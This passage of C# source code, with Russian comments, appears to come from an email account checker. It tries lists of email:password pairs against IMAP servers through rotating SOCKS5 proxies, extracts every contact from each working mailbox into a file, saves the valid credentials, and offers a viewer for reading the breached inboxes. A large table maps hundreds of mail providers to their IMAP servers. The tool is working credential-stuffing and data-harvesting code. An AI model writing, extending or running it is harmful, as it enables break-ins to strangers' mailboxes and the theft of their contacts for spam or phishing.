                                var clientResult = await TryConnectWithRetry(acc.Email, acc.Password, domain, proxy);
                                if (!clientResult.Success)
                                {
                                    errors.Add($"{acc.Email} - {clientResult.Message}");
                                    statusMsg = $"{accDisp} - {clientResult.Message}";
                                    color = ConsoleColor.Red;
                                    realTimeResults.Add($"❌ {accDisp} - {clientResult.Message}");
                                }
                                else
                                {
                                    Interlocked.Increment(ref validCount);
                                    try
                                    {
                                        // Используем НАШ НОВЫЙ МЕТОД который собирает ВСЕ КОНТАКТЫ из ВСЕХ ПАПОК
                                        await ExtractAllContactsFromMailbox(clientResult.Client);
                                        try { await clientResult.Client.DisconnectAsync(true); } catch { }
                                        try { clientResult.Client.Dispose(); } catch { }
                                        // Аккаунт валиден, мы собрали все контакты из него через ExtractAllContactsFromMailbox
                                        statusMsg = $"{accDisp} - ВАЛИДЕН, контакты извлечены";
                                        color = ConsoleColor.Green;
                                        realTimeResults.Add($"✅ {accDisp} - аккаунт обработан, все контакты сохранены");
                                        
                                        // Записываем валидный аккаунт в файл
                                        var validRec = $"{acc.Email}:{acc.Password}:{clientResult.UsedServer}:{clientResult.UsedPort}:{clientResult.UsedSsl}";
                                        lock (workingAccounts) {
                                            File.AppendAllText(workingFile, validRec + Environment.NewLine);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        try { clientResult.Client?.Disconnect(true); } catch { }
                                        try { clientResult.Client?.Dispose(); } catch { }
                                        errors.Add($"{acc.Email} - ошибка при сканировании: {ex.Message}");
                                        statusMsg = $"{accDisp} - ошибка при сканировании";
                                        color = ConsoleColor.Red;
                                        realTimeResults.Add($"❌ {accDisp} - ошибка при сканировании");
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        errors.Add($"{acc.Email} - общая ошибка: {ex.Message}");
                        statusMsg = $"{accDisp} - общая ошибка";
                        color = ConsoleColor.Red;
                        realTimeResults.Add($"❌ {accDisp} - общая ошибка");
                    }
                    finally
                    {
                        lock (printLock)
                        {
                            accountResults[accIndex] = statusMsg;
                            colorResults[accIndex] = color;
                        }
                        Interlocked.Increment(ref processed);
                        throttler.Release();
                    }
                });
                tasks.Add(task);
            }

            var spinner = new[] { '|', '/', '-', '\\' };
            bool exitRequested = false;
            
            while (processed < accounts.Count && !exitRequested)
            {
                Console.SetCursorPosition(0, 0);
                double percent = accounts.Count == 0 ? 0 : (processed * 100.0 / accounts.Count);
                UI.DrawHeader("СБОР КОНТАКТОВ", $"Потоки: {maxThreads}  Таймаут: {connectTimeout}s  Прокси: {(proxyEnabled ? "ВКЛ" : "ВЫКЛ")}", 90);
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write($"ПРОГРЕСС: {percent:0.0}% | ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write($"ОБРАБОТАНО: {processed}/{accounts.Count} | ");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write($"ВСЕ КОНТАКТЫ СОХРАНЯЮТСЯ В extracted_contacts.txt   ");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"{spinner[processed % spinner.Length]}");
                Console.ResetColor();
                
                UI.WriteLine("Нажмите Q для выхода в главное меню", ConsoleColor.DarkGray);

                for (int i = 0; i < accounts.Count; i++)
                {
                    ConsoleColor c = colorResults[i];
                    string msg = accountResults[i];
                    if (!string.IsNullOrEmpty(msg))
                    {
                        UI.WriteLine(msg, c);
                    }
                    else
                    {
                        UI.WriteLine($"{accounts[i].Email} - ...", ConsoleColor.DarkGray);
                    }
                }
                
                // Проверка нажатия клавиши Q
                if (Console.KeyAvailable)
                {
                    var key = Console.ReadKey(true);
                    if (key.Key == ConsoleKey.Q)
                    {
                        exitRequested = true;
                    }
                }
                
                await Task.Delay(200);
            }
            
            // Если запрошен выход, отменяем оставшиеся задачи
            if (exitRequested)
            {
                UI.WriteLine("\nВыход в главное меню...", ConsoleColor.Yellow);
                await Task.Delay(1000);
                return;
            }
            await Task.WhenAll(tasks);

            // 🧹 Финальная очистка дубликатов в файле контактов (гарантируем что дублей нет)
            string contactsFile = "extracted_contacts.txt";
            if (File.Exists(contactsFile))
            {
                var allLines = File.ReadAllLines(contactsFile)
                                  .Where(line => !string.IsNullOrWhiteSpace(line)) // Удаляем пустые строки
                                  .Distinct() // Удаляем дубликаты
                                  .ToList();
                File.WriteAllLines(contactsFile, allLines);
                UI.WriteLine($"\n✅ Сбор контактов завершен! Всего уникальных контактов сохранено: {allLines.Count}", ConsoleColor.Green);
            }

            try
            {
                File.WriteAllLines(workingFile, workingAccounts.Select(w => w.Record).OrderBy(x => x));
                var detailed = workingAccounts
                    .Select(w => FormatDetailedRecord(w.Record, w.Counts))
                    .OrderBy(x => x)
                    .ToList();
                File.WriteAllLines(results, detailed);
                File.WriteAllLines(errorsFile, errors.OrderBy(x => x));
            }
            catch
            {
                UI.WriteLine("Ошибка записи файлов.", ConsoleColor.Red);
            }

            Console.Clear();

            UI.WriteLine("Результат сканирования - рабочие аккаунты:", ConsoleColor.DarkGray);
            if (workingAccounts.Count == 0)
            {
                UI.WriteLine("Нет рабочих аккаунтов.", ConsoleColor.Yellow);
            }
            else
            {
                foreach (var w in workingAccounts.OrderBy(x => x.Record))
                {
                    var p = w.Record.Split(new[] { ':', ';' }, 5);
                    var email = p.ElementAtOrDefault(0) ?? "";
                    var server = p.ElementAtOrDefault(2) ?? "unknown";
                    var port = int.TryParse(p.ElementAtOrDefault(3), out var prt) ? prt : 993;
                    var total = w.Counts.Values.Sum();
                    var sendersList = string.Join(", ", w.Counts.Select(kv => $"{kv.Key} ({kv.Value})"));
                    UI.WriteLine($"{email} ({server}:{port}) — отправителей: {w.Counts.Count}, писем: {total}", ConsoleColor.Green);
                    UI.WriteLine($"Отправители: {sendersList}", ConsoleColor.DarkGray);
                }
            }

            UI.WriteLine($"Сканирование завершено. Рабочих: {workingAccounts.Count}, Ошибок: {errors.Count}", ConsoleColor.DarkGray);
            
            // Обновляем глобальные переменные
            processedAccounts = processed;
            validAccounts = validCount;
            foundMessages = foundCount;
            
            UI.WaitKey("Нажмите любую клавишу чтобы продолжить...");
        }

        private string FormatDetailedRecord(string record, Dictionary<string, int> counts)
        {
            var parts = record.Split(new[] { ':', ';' }, 5);
            var email = parts.ElementAtOrDefault(0) ?? "";
            var password = parts.ElementAtOrDefault(1) ?? "";

            var senderParts = counts.OrderByDescending(kv => kv.Value).Select(kv => $"{kv.Key}:{kv.Value}");
            var joinedSenders = string.Join(" ", senderParts);
            if (string.IsNullOrEmpty(joinedSenders)) joinedSenders = "no_senders:0";

            return $"{email}:{password} {joinedSenders}";
        }

        private async Task ShowWorkingAccounts()
        {
            if (!File.Exists(workingFile)) { UI.WriteLine("Файл рабочих аккаунтов не найден.", ConsoleColor.Red); return; }
            var lines = File.ReadAllLines(workingFile).Where(l => !string.IsNullOrWhiteSpace(l)).ToList();
            if (lines.Count == 0) { UI.WriteLine("Нет рабочих аккаунтов.", ConsoleColor.Red); return; }

            var accounts = lines.Select(l =>
            {
                var p = l.Split(new[] { ':', ';' }, 5);
                return (
                    Email: p.ElementAtOrDefault(0) ?? "",
                    Password: p.ElementAtOrDefault(1) ?? "",
                    Server: p.ElementAtOrDefault(2) ?? "",
                    Port: int.TryParse(p.ElementAtOrDefault(3), out var z) ? z : 993,
                    UseSsl: bool.TryParse(p.ElementAtOrDefault(4), out var b) ? b : true
                );
            }).ToList();

            while (true)
            {
                Console.Clear();
                UI.WriteLine("Рабочие аккаунты:", ConsoleColor.Green);
                for (int i = 0; i < accounts.Count; i++)
                {
                    var acc = accounts[i];
                    string server = string.IsNullOrWhiteSpace(acc.Server) ? "unknown" : acc.Server;
                    int port = acc.Port > 0 ? acc.Port : 993;
                    UI.WriteLine($"{i + 1}) {acc.Email} ({server}:{port})", ConsoleColor.Green);
                }

                UI.WriteLine("Введите номер аккаунта для просмотра или Q для выхода:", ConsoleColor.DarkGray);
                var inp = Console.ReadLine()?.Trim();
                if (string.Equals(inp, "q", StringComparison.OrdinalIgnoreCase)) break;
                if (!int.TryParse(inp, out int idx) || idx < 1 || idx > accounts.Count) continue;

                var selectedAcc = accounts[idx - 1];
                await MailViewer.ViewMailboxInteractiveAsync(selectedAcc.Email, selectedAcc.Password, selectedAcc.Server, selectedAcc.Port, selectedAcc.UseSsl, sendersFile);
            }
        }

        private static bool IsValidEmail(string email)
        {
            if (string.IsNullOrWhiteSpace(email)) return false;
            try
            {
                return Regex.IsMatch(email, @"^[^@\s]+@[^@\s]+\.[^@\s]+$", RegexOptions.IgnoreCase, TimeSpan.FromMilliseconds(250));
            }
            catch { return false; }
        }


    }

    static class UI
    {
        public static void DrawHeader(string title, string subtitle, int width)
        {
            Console.Clear();
            if (width < 40) width = 40;
            string border = new string('═', width - 2);
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("╔" + border + "╗");
            Console.WriteLine("║" + CenterText(title, width - 2) + "║");
            Console.WriteLine("╠" + border + "╣");
            Console.WriteLine("║" + CenterText(subtitle, width - 2) + "║");
            Console.WriteLine("╚" + border + "╝");
            Console.ResetColor();
            Console.WriteLine();
        }

        public static void DrawMenu(string[] items, int selected)
        {
            for (int i = 0; i < items.Length; i++)
            {
                if (i == selected)
                {
                    Console.BackgroundColor = ConsoleColor.DarkCyan;
                    Console.ForegroundColor = ConsoleColor.White;
                }
                else
                {
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.Green;
                }
                Console.WriteLine($" {i + 1}) {items[i]}");
            }
            Console.ResetColor();
            Console.WriteLine("\n↑/↓ — навигация, Enter — выбрать, Q — выход\n");
        }

        public static void WriteLine(string text, ConsoleColor color)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(text);
            Console.ResetColor();
        }

        public static void WaitKey(string text)
        {
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine(text);
            Console.ResetColor();
            Console.ReadKey(true);
        }

        public static void PrintProgressBar(int percent, int width = 40)
        {
            int filled = (int)(percent / 100.0 * width);
            Console.CursorLeft = 0;
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("[");
            Console.Write(new string('█', filled));
            Console.Write(new string(' ', width - filled));
            Console.Write($"] {percent}%");
            Console.ResetColor();
            Console.WriteLine();
        }

        private static string CenterText(string text, int width)
        {
            if (text.Length >= width) return text.Substring(0, width);
            int pad = (width - text.Length) / 2;
            return new string(' ', pad) + text + new string(' ', width - text.Length - pad);
        }
    }

    public static class StringExtensions
    {
        public static string CenterString(this string str, int width)
        {
            if (str.Length >= width) return str;
            int leftPadding = (width - str.Length) / 2;
            int rightPadding = width - str.Length - leftPadding;
            return new string(' ', leftPadding) + str + new string(' ', rightPadding);
        }
    }

class ProxyManager
{
    private readonly List<string> validSocks5Proxies = new List<string>();
    private readonly HashSet<string> deadProxies = new HashSet<string>();
    private int pointer = 0;
    private readonly object lockObj = new object();
    private string? selectedManualProxy;

    public ProxyManager(string file)
    {
        LoadAndValidateProxies(file);
    }

    private void LoadAndValidateProxies(string file)
    {
        validSocks5Proxies.Clear();
        deadProxies.Clear();
        
        if (!File.Exists(file))
        {
            Console.WriteLine("[PROXY_ERROR] Файл с прокси не найден");
            return;
        }

        var allLines = File.ReadAllLines(file).Where(x => !string.IsNullOrWhiteSpace(x)).Select(x => x.Trim()).ToList();
        int invalidCount = 0;

        foreach (var line in allLines)
        {
            if (ValidateSocks5Proxy(line, out string? validProxy))
            {
                if (!validSocks5Proxies.Contains(validProxy!))
                {
                    validSocks5Proxies.Add(validProxy!);
                }
            }
            else
            {
                invalidCount++;
                Console.WriteLine($"[PROXY_WARN] Невалидный SOCKS5 прокси отброшен: {line}");
            }
        }

        Console.WriteLine($"[PROXY_INFO] Загружено {validSocks5Proxies.Count} валидных SOCKS5 прокси, отброшено {invalidCount} невалидных");
    }

    private bool ValidateSocks5Proxy(string proxyLine, out string? validProxy)
        {
            validProxy = null;
            
            string cleanProxy = proxyLine.Trim();

            
            if (cleanProxy.StartsWith("socks5://", StringComparison.OrdinalIgnoreCase))
            {
                cleanProxy = cleanProxy.Substring(9);
            }
            else if (cleanProxy.Contains("://"))
            {
                Console.WriteLine($"[PROXY_ERROR] Отклонен не-SOCKS5 прокси: {proxyLine} (только SOCKS5 поддерживаются)");
                return false;
            }

            // Обрабатываем формат с аутентификацией: user:pass@host:port
            string hostPortPart;
            if (cleanProxy.Contains('@'))
            {
                var atParts = cleanProxy.Split('@');
                hostPortPart = atParts[atParts.Length - 1]; // Берем хост:порт из конца строки
            }
            else
            {
                hostPortPart = cleanProxy;
            }

            var hostPortParts = hostPortPart.Split(':');
            if (hostPortParts.Length < 2)
            {
                return false;
            }

            if (!int.TryParse(hostPortParts[1], out int port) || port < 1 || port > 65535)
            {
                return false;
            }

            if (string.IsNullOrWhiteSpace(hostPortParts[0]))
            {
                return false;
            }

            validProxy = $"socks5://{cleanProxy}";
            return true;
        }

    public string? GetNextProxy()
    {
        if (selectedManualProxy != null)
        {
            return selectedManualProxy;
        }

        lock (lockObj)
        {
            var availableProxies = validSocks5Proxies.Where(p => !deadProxies.Contains(p)).ToList();
            if (availableProxies.Count == 0)
            {
                Console.WriteLine("[PROXY_ERROR] Нет доступных живых прокси");
                return null;
            }

            int idx = Interlocked.Increment(ref pointer);
            return availableProxies[(idx - 1) % availableProxies.Count];
        }
    }

    public void SetManualProxy(string? proxy)
    {
        selectedManualProxy = proxy;
        if (proxy != null)
        {
            Console.WriteLine($"[PROXY_INFO] Выбран ручной прокси: {proxy}");
        }
        else
        {
            Console.WriteLine("[PROXY_INFO] Ручной выбор прокси отключен, используется автоматическая ротация");
        }
    }

    public string? GetSelectedProxy() => selectedManualProxy;

    public void MarkProxyAsDead(string proxy)
    {
        lock (lockObj)
        {
            if (!deadProxies.Contains(proxy))
            {
                deadProxies.Add(proxy);
                Console.WriteLine($"[PROXY_ERROR] Прокси помечен как мертвый: {proxy}, осталось живых: {validSocks5Proxies.Count - deadProxies.Count}");
            }
        }
    }

    public void ReviveAllProxies()
    {
        lock (lockObj)
        {
            deadProxies.Clear();
            Console.WriteLine("[PROXY_INFO] Все прокси восстановлены");
        }
    }

    public async Task<bool> TestProxyAsync(string proxy, TimeSpan timeout)
        {
            try
            {
                var cleanProxy = proxy.Replace("socks5://", "");
                string host;
                int port;
                string? username = null;
                string? password = null;
                
                // Обрабатываем формат с аутентификацией: user:pass@host:port
                if (cleanProxy.Contains('@'))
                {
                    var atParts = cleanProxy.Split('@');
                    var authPart = atParts[0];
                    var hostPortPart = atParts[atParts.Length - 1];
                    var hostPortParts = hostPortPart.Split(':');
                    if (hostPortParts.Length < 2) return false;
                    host = hostPortParts[0];
                    port = int.Parse(hostPortParts[1]);
                    
                    // Извлекаем логин и пароль
                    var authParts = authPart.Split(':');
                    if (authParts.Length >= 2)
                    {
                        username = authParts[0];
                        password = string.Join(":", authParts.Skip(1));
                    }
                }
                else
                {
                    // Обычный формат: host:port
                    var proxyParts = cleanProxy.Split(':');
                    if (proxyParts.Length < 2) return false;
                    host = proxyParts[0];
                    port = int.Parse(proxyParts[1]);
                }

            using var cts = new CancellationTokenSource(timeout);
            using var client = new TcpClient();
            var connectTask = client.ConnectAsync(host, port, cts.Token).AsTask();
            var completedTask = await Task.WhenAny(connectTask, Task.Delay(timeout, cts.Token));
            
            if (completedTask != connectTask || !client.Connected)
            {
                Console.WriteLine($"[PROXY_FAIL] Прокси не отвечает: {proxy}");
                MarkProxyAsDead(proxy);
                return false;
            }

            // SOCKS5 handshake с проверкой аутентификации
            var stream = client.GetStream();
            var networkStream = stream;
            byte[] buffer = new byte[1024];

            // Шаг 1: Отправляем версию SOCKS5 и поддерживаемые методы аутентификации
            if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
            {
                // Поддерживаем только аутентификацию с логином/паролем (метод 0x02)
                byte[] greeting = { 0x05, 0x01, 0x02 };
                await networkStream.WriteAsync(greeting, 0, greeting.Length, cts.Token);
            }
            else
            {
                // Анонимное подключение (метод 0x00)
                byte[] greeting = { 0x05, 0x01, 0x00 };
                await networkStream.WriteAsync(greeting, 0, greeting.Length, cts.Token);
            }

            // Читаем ответ от прокси с выбранным методом аутентификации
            var bytesRead = await networkStream.ReadAsync(buffer, 0, 2, cts.Token);
            if (bytesRead < 2 || buffer[0] != 0x05)
            {
                Console.WriteLine($"[PROXY_FAIL] Некорректный ответ SOCKS5 от прокси: {proxy}");
                client.Close();
                MarkProxyAsDead(proxy);
                return false;
            }

            // Если прокси требует аутентификацию, а мы не передали данные — провал
            if (buffer[1] == 0xFF)
            {
                Console.WriteLine($"[PROXY_FAIL] Прокси требует аутентификацию, а данные не переданы: {proxy}");
                client.Close();
                MarkProxyAsDead(proxy);
                return false;
            }

            // Если нужно пройти аутентификацию с логином/паролем
            if (buffer[1] == 0x02 && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
            {
                // Формируем пакет аутентификации (версия 0x01, длина логина, логин, длина пароля, пароль)
                var userBytes = System.Text.Encoding.UTF8.GetBytes(username);
                var passBytes = System.Text.Encoding.UTF8.GetBytes(password);
                byte[] authRequest = new byte[3 + userBytes.Length + passBytes.Length];
                authRequest[0] = 0x01;
                authRequest[1] = (byte)userBytes.Length;
                Array.Copy(userBytes, 0, authRequest, 2, userBytes.Length);
                authRequest[2 + userBytes.Length] = (byte)passBytes.Length;
                Array.Copy(passBytes, 0, authRequest, 3 + userBytes.Length, passBytes.Length);
                
                await networkStream.WriteAsync(authRequest, 0, authRequest.Length, cts.Token);
                
                // Читаем ответ аутентификации
                bytesRead = await networkStream.ReadAsync(buffer, 0, 2, cts.Token);
                if (bytesRead < 2 || buffer[1] != 0x00)
                {
                    Console.WriteLine($"[PROXY_FAIL] Неверный логин или пароль для прокси: {proxy}");
                    client.Close();
                    MarkProxyAsDead(proxy);
                    return false;
                }
            }

            // Пробуем подключиться к тестовому адресу (например, 8.8.8.8:53 чтобы проверить работоспособность)
            byte[] connectRequest = { 0x05, 0x01, 0x00, 0x01, 8,8,8,8, 0x00, 0x35 };
            await networkStream.WriteAsync(connectRequest, 0, connectRequest.Length, cts.Token);

            // Читаем ответ на подключение
            bytesRead = await networkStream.ReadAsync(buffer, 0, 10, cts.Token);
            if (bytesRead < 10 || buffer[1] != 0x00)
            {
                Console.WriteLine($"[PROXY_FAIL] Прокси не может установить исходящее соединение: {proxy}, код ошибки: 0x{buffer[1]:X2}");
                client.Close();
                MarkProxyAsDead(proxy);
                return false;
            }

            client.Close();
            Console.WriteLine($"[PROXY_OK] Прокси полностью работает (аутентификация пройдена): {proxy}");
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[PROXY_FAIL] Прокси {proxy} не прошел проверку: {ex.Message}");
            MarkProxyAsDead(proxy);
            return false;
        }
    }

    public List<string> GetAllProxies() => validSocks5Proxies.ToList();
    public HashSet<string> GetDeadProxies() => deadProxies;
    public int GetAliveProxiesCount() => validSocks5Proxies.Count - deadProxies.Count;
}

    static class ImapHelper
    {
        private static readonly int[] ImapPorts = { 993, 143, 585, 1993, 2193, 443, 995 };
        private static readonly string[] ImapHosts = { "imap.{0}", "mail.{0}", "imap-mail.{0}", "imap4.{0}", "webmail.{0}", "{0}" };
        public static Dictionary<string, (string server, int port, bool ssl)> GetImapDictionary() => new Dictionary<string, (string, int, bool)>(StringComparer.OrdinalIgnoreCase)
        {
            { "gmail.com", ("imap.gmail.com", 993, true) },
            { "mail.ru", ("imap.mail.ru", 993, true) },
            { "yandex.ru", ("imap.yandex.ru", 993, true) },
            { "outlook.com", ("imap-mail.outlook.com", 993, true) },
            { "hotmail.com", ("imap-mail.outlook.com", 993, true) },
            { "icloud.com", ("imap.mail.me.com", 993, true) },
            { "rambler.ru", ("imap.rambler.ru", 993, true) },
            { "freenet.de", ("mx.freenet.de", 993, true) },
            { "web.de", ("imap.web.de", 993, true) },
            { "hotmail.de", ("imap-mail.outlook.com", 993, true) },
            { "online.de", ("imap.1und1.de", 993, true) },
            { "magenta.de", ("secureimap.t-online.de", 993, true) },
            { "t-online.de", ("secureimap.t-online.de", 993, true) },
            { "posteo.de", ("posteo.de", 993, true) },
            { "onlinehome.de", ("imap.1und1.de", 993, true) },
            { "skymail.de", ("imap.tools.sky.com", 993, true) },
            { "libero.it", ("imapmail.libero.it", 993, true) },
            { "gmx.de", ("imap.gmx.net", 993, true) },
            { "mail.de", ("imap.mail.de", 993, true) },
            { "ionos.de", ("imap.ionos.com", 993, true) },
            { "1und1.de", ("imap.1und1.de", 993, true) },
            { "strato.de", ("imap.strato.de", 993, true) },
            { "arcor.de", ("imap.arcor.de", 993, true) },
            { "vodafone.de", ("imap.vodafone.de", 993, true) },
            { "yahoo.de", ("imap.mail.yahoo.com", 993, true) },
            { "aol.de", ("imap.aol.com", 993, true) },
            { "gmx.net", ("imap.gmx.net", 993, true) },
            { "tiscali.de", ("imap.tiscali.de", 993, true) },
            { "howtogetafreeiphone.info", ("imap.howtogetafreeiphone.info", 993, true) },
            { "onet.eu", ("imap.poczta.onet.pl", 993, true) },
            { "cakir.com", ("imap.cakir.com", 993, true) },
            { "adelphia.net", ("mail.twc.com", 993, true) },
            { "xlxe.pl", ("imap.xlxe.pl", 993, true) },
            { "mannbdinfo.org", ("imap.mannbdinfo.org", 993, true) },
            { "rooseveltmail.com", ("imap.rooseveltmail.com", 993, true) },
            { "mailref.net", ("imap.mailref.net", 993, true) },
            { "blog4us.eu", ("imap.blog4us.eu", 993, true) },
            { "hotil.it", ("imap.hotil.it", 993, true) },
            { "azmailz.com", ("imap.azmailz.com", 993, true) },
            { "giochi0.it", ("imap.giochi0.it", 993, true) },
            { "mailbox.org", ("imap.mailbox.org", 993, true) },
            { "netcologne.de", ("imap.netcologne.de", 993, true) },
            { "ewe.net", ("imap.ewe.net", 993, true) },
            { "versatel.de", ("mx.versatel.de", 143, false) },
            { "kabelmail.de", ("imap.kabelmail.de", 993, true) },
            { "hosteurope.de", ("<your-server>.mail.server-he.de", 993, true) },
            { "df.eu", ("sslin.df.eu", 993, true) },
            { "1blu.de", ("imap.1blu.de", 993, true) },
            { "netcup.net", ("<your-mx-host>.netcup.net", 993, true) },
            { "all-inkl.com", ("<your-login>.kasserver.com", 993, true) },
            { "profihost.de", ("<server-name>.profihost.de", 993, true) },
            { "hetzner.com", ("mail.<your-server>.de", 993, true) },
            { "checkdomain.de", ("<your-server>.checkdomain.net", 993, true) },
            { "hosteurope", ("wpx<id>.mail.server-he.de", 993, true) },
            { "onet.pl", ("imap.poczta.onet.pl", 993, true) },
            { "interia.pl", ("poczta.interia.pl", 993, true) },
            { "nazwa.pl", ("imap.nazwa.pl", 993, true) },
            { "orange.fr", ("imap.orange.fr", 993, true) },
            { "free.fr", ("imap.free.fr", 993, true) },
            { "laposte.net", ("imap.laposte.net", 993, true) },
            { "sfr.fr", ("imap.sfr.fr", 993, true) },
            { "protonmail.com", ("127.0.0.1 (use Proton Bridge)", 993, true) },
            { "aol.com", ("imap.aol.com", 993, true) },
            { "comcast.net", ("imap.comcast.net", 993, true) },
            { "att.net", ("imap.mail.att.net", 993, true) },
            { "verizon.net", ("imap.verizon.net", 993, true) },
            { "charter.net", ("imap.charter.net", 993, true) },
            { "mail.com", ("imap.mail.com", 993, true) },
            { "zoho.com", ("imap.zoho.com", 993, true) },
            { "fastmail.com", ("imap.fastmail.com", 993, true) },
            { "excite.com", ("imap.excite.com", 993, true) },
            
            // Франция - дополнительные
            { "alice.fr", ("imap.aliceadsl.fr", 993, true) },
            { "aliceadsl.fr", ("imap.aliceadsl.fr", 993, true) },
            { "bbox.fr", ("imap.bbox.fr", 993, true) },
            { "cegetel.net", ("imap.cegetel.net", 993, true) },
            { "club-internet.fr", ("imap.club-internet.fr", 993, true) },
            { "dbmail.com", ("imap.dbmail.com", 993, true) },
            { "easyconnect.fr", ("imap.easyconnect.fr", 993, true) },
            { "ec-lille.fr", ("imap.ec-lille.fr", 993, true) },
            { "educagri.fr", ("imap.educagri.fr", 993, true) },
            { "email.it", ("imap.email.it", 993, true) },
            { "gmx.fr", ("imap.gmx.com", 993, true) },
            { "hotmail.fr", ("imap-mail.outlook.com", 993, true) },
            { "icloud.fr", ("imap.mail.me.com", 993, true) },
            { "infonie.fr", ("imap.infonie.fr", 993, true) },
            { "laposte.fr", ("imap.laposte.net", 993, true) },
            { "live.fr", ("imap-mail.outlook.com", 993, true) },
            { "lycos.fr", ("imap.lycos.com", 993, true) },
            { "msn.fr", ("imap-mail.outlook.com", 993, true) },
            { "neuf.fr", ("imap.neuf.fr", 993, true) },
            { "noos.fr", ("imap.noos.fr", 993, true) },
            { "numericable.fr", ("imap.numericable.fr", 993, true) },
            { "numericable.com", ("imap.numericable.fr", 993, true) },
            { "outlook.fr", ("imap-mail.outlook.com", 993, true) },
            { "paris.fr", ("imap.paris.fr", 993, true) },
            { "sfr.com", ("imap.sfr.fr", 993, true) },
            { "tele2.fr", ("imap.tele2.fr", 993, true) },
            { "terra.fr", ("imap.terra.es", 993, true) },
            { "wanadoo.fr", ("imap.wanadoo.fr", 993, true) },
            { "yahoo.fr", ("imap.mail.yahoo.com", 993, true) },
            
            // Германия - дополнительные
            { "alice.de", ("imap.alice.de", 993, true) },
            { "freenet.com", ("mx.freenet.de", 993, true) },
            { "gmx.com", ("imap.gmx.com", 993, true) },
            { "gmx.eu", ("imap.gmx.com", 993, true) },
            { "icloud.de", ("imap.mail.me.com", 993, true) },
            { "live.de", ("imap-mail.outlook.com", 993, true) },
            { "lycos.de", ("imap.lycos.com", 993, true) },
            { "msn.de", ("imap-mail.outlook.com", 993, true) },
            { "netcologne.com", ("imap.netcologne.de", 993, true) },
            { "outlook.de", ("imap-mail.outlook.com", 993, true) },
            { "t-online.com", ("secureimap.t-online.de", 993, true) },
            { "telekom.de", ("secureimap.t-online.de", 993, true) },
            { "versanet.de", ("mx.versatel.de", 143, false) },
            
            // Чехия
            { "centrum.cz", ("imap.centrum.cz", 993, true) },
            { "email.cz", ("imap.email.cz", 993, true) },
            { "gmail.cz", ("imap.gmail.com", 993, true) },
            { "hotmail.cz", ("imap-mail.outlook.com", 993, true) },
            { "icloud.cz", ("imap.mail.me.com", 993, true) },
            { "live.cz", ("imap-mail.outlook.com", 993, true) },
            { "outlook.cz", ("imap-mail.outlook.com", 993, true) },
            { "post.cz", ("imap.post.cz", 993, true) },
            { "seznam.cz", ("imap.seznam.cz", 993, true) },
            { "tiscali.cz", ("imap.tiscali.cz", 993, true) },
            { "volny.cz", ("imap.volny.cz", 993, true) },
            { "yahoo.cz", ("imap.mail.yahoo.com", 993, true) },
            
            // Польша - дополнительные
            { "gazeta.pl", ("imap.gazeta.pl", 993, true) },
            { "home.pl", ("post.pl", 993, true) },
            { "o2.pl", ("poczta.o2.pl", 993, true) },
            { "op.pl", ("imap.poczta.onet.pl", 993, true) },
            { "poczta.fm", ("poczta.interia.pl", 993, true) },
            { "poczta.onet.pl", ("imap.poczta.onet.pl", 993, true) },
            { "vp.pl", ("imap.poczta.onet.pl", 993, true) },
            { "yahoo.pl", ("imap.mail.yahoo.com", 993, true) },
            
            // Италия - дополнительные
            { "alice.it", ("imap.alice.it", 993, true) },
            { "gmail.it", ("imap.gmail.com", 993, true) },
            { "hotmail.it", ("imap-mail.outlook.com", 993, true) },
            { "icloud.it", ("imap.mail.me.com", 993, true) },
            { "infinito.it", ("imapmail.infinito.it", 993, true) },
            { "inwind.it", ("imapmail.inwind.it", 993, true) },
            { "live.it", ("imap-mail.outlook.com", 993, true) },
            { "outlook.it", ("imap-mail.outlook.com", 993, true) },
            { "supereva.it", ("imap.supereva.it", 993, true) },
            { "tele2.it", ("imap.tele2.it", 993, true) },
            { "tiscali.it", ("imap.tiscali.it", 993, true) },
            { "tin.it", ("imap.tin.it", 993, true) },
            { "virgilio.it", ("imapmail.virgilio.it", 993, true) },
            { "yahoo.it", ("imap.mail.yahoo.com", 993, true) },
            
            // Дополнительные популярные сервера
            { "yahoo.com", ("imap.mail.yahoo.com", 993, true) },
            
            // Дополнительные серверы для t-online и немецких провайдеров
            { "yahoo.co.uk", ("imap.mail.yahoo.com", 993, true) },
            { "yahoo.ca", ("imap.mail.yahoo.com", 993, true) },
            { "yahoo.com.au", ("imap.mail.yahoo.com", 993, true) },
            { "yahoo.com.br", ("imap.mail.yahoo.com", 993, true) },
            { "yahoo.co.jp", ("imap.mail.yahoo.co.jp", 993, true) },
            { "yahoo.es", ("imap.mail.yahoo.com", 993, true) },
            { "yahoo.in", ("imap.mail.yahoo.com", 993, true) },
            
            { "aol.co.uk", ("imap.aol.com", 993, true) },
            { "aol.com.br", ("imap.aol.com", 993, true) },
            
            { "gmx.ch", ("imap.gmx.com", 993, true) },
            { "gmx.at", ("imap.gmx.com", 993, true) },
            
            { "t-online.at", ("secureimap.t-online.de", 993, true) },
            
            { "orange.co.uk", ("imap.orange.co.uk", 993, true) },
            { "orange.es", ("imap.orange.es", 993, true) },
            { "orange.pl", ("poczta.orange.pl", 993, true) },
            { "orange.ch", ("imap.orange.ch", 993, true) },
            { "orange.be", ("imap.orange.be", 993, true) },
            { "orange.ro", ("imap.orange.ro", 993, true) },
            
            { "alice.com", ("imap.alice.it", 993, true) },
            { "aliceadsl.it", ("imap.alice.it", 993, true) },
            
            { "interia.eu", ("poczta.interia.pl", 993, true) },
            { "interia.com", ("poczta.interia.pl", 993, true) },
            { "interia.com.pl", ("poczta.interia.pl", 993, true) },
            
            { "seznam.com", ("imap.seznam.cz", 993, true) },
            { "seznam.sk", ("imap.seznam.cz", 993, true) },
            
            { "aliyun.com", ("imap.aliyun.com", 993, true) },
            
            { "rediffmail.com", ("imap.rediffmail.com", 993, true) },
            { "rediff.com", ("imap.rediffmail.com", 993, true) },
